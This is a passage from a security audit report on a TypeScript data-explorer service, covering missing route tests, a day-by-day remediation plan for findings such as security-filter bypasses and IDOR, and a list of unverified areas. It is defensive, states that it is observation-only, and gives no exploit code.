- `furnaceSqlService.ts:55`: `INSTALL 'json'; LOAD 'json';` swallowed via `.catch()`.
- `queryExecutor.ts:181`: catches OS failures, returns null. Add `tellus_security_check_failure_total`.

### 6.5 Test Coverage

#### T-27. Structural absence of explorer-route tests.

`src/tests/` has only `helpers/`, `indexing/`, `interfaces.test.ts`. Day-bucketed integration tests (`tests/{tuesday,wednesday,thursday,saturday}/integration/*-integration.test.ts`) are the only files that grep-match the explorer routes. No per-route unit tests for `routes/objects.ts`, `objectViews.ts`, `charts.ts`, `sql.ts`, `summary.ts`, `comparisons.ts`, `explorations.ts`, `exports.ts`, `favorites.ts`. No contract test asserting branch-header propagation.

**Fix.**
1. Per-route handler tests (supertest): happy path, 4xx-input, unauthorized, empty-marking (asserts marked rows excluded), cross-branch (asserts isolation).
2. AST-level test (`ts-morph`): walks every route file; asserts handlers whose names contain `search`, `aggregate`, `view`, `chart`, `sql`, `comparison`, `linked`, `summary` call `buildSecurityFilter` and `readBranchHeader`.

---

## 7. Recommended Next Steps

1. **(Day 1)** Replace `wrapWithSecurity` in `comparisons.ts`/`charts.ts` with `applyContextToQuery(query, securityFilter, branchId)`. Delete `charts.ts:36-78`. **Closes B-1, B-3.**
2. **(Day 1–2)** SQL hardening: marking-aware load, DuckDB external-access lockdown, statement timeout, restricted invalidate. **Closes B-2, H-8, H-9, M-22.**
3. **(Day 2–3)** Strip `exports.ts` fakery; add `requested_by` predicates; stub worker (501 on download); plan real worker week 2. **Closes IDOR half of H-4.**
4. **(Day 3–5)** `OverlayRecord.branchId` migration. **Closes H-5.**
5. **(Day 4)** `readBranchHeader(req)` in `batchView`. **Closes H-7.**
6. **(Day 4)** Replace `|| "system"` with `throw UNAUTHORIZED`. Add marking filter to summary. **Closes H-6, M-17.**
7. **(Day 5)** Gate helpful 404 message. **Closes H-10.**
8. **(Week 2)** Centralize response envelope; pick error vocabulary. **Closes H-11, M-15.**
9. **(Week 2)** `query_string` clause for spec-syntax inputs. **Closes M-13.**
10. **(Week 2)** `visitedPKs` + chunked concurrency in `resolveMultiHop`. **Closes M-19.**
11. **(Week 3)** Promise-mutex on DuckDB cache. **Closes M-18.**
12. **(Week 3)** Per-route handler tests + AST contract test. **Closes T-27.**
13. **(Week 4)** Cache alias resolution. **Closes M-21.**
14. **(Backlog)** `MAX_PAGE_SIZE`, `OP_MAP` ambiguity, dead-code cleanup.

Total senior-engineer-time to "production-credible under audit": ≈3 person-weeks for one engineer, ≈10 days for two engineers running parallel tracks.

---

## 8. Methodology and Unknowns

- `MAX_PAGE_SIZE = 10000` inferred from `queryValidator.ts:651`'s test "pageSize 10001 rejected." `src/utils/constants.ts` not opened.
- The `editHistory` handler (`routes/objects.ts` near `:580`) was not read in full. Security/branch wiring unverified.
- The overlay `put` (write side) was not read; H-5 is based on read side and `OverlayRecord`'s shape.
- DuckDB external-access default behavior inferred from DuckDB docs; codebase does not configure it.
- `_security` mapping on legacy documents inferred from `must_not.exists` disjunct; index template not opened.
- `actions/`, `routes/edits.ts`, `routes/auditLog.ts` referenced via mount points only; spec §31-36 not deeply audited.

A complete audit of these unknowns is one additional engineer-week and should be commissioned before any go-live with audit obligations.

---

The audit is observation-only. No code was modified.
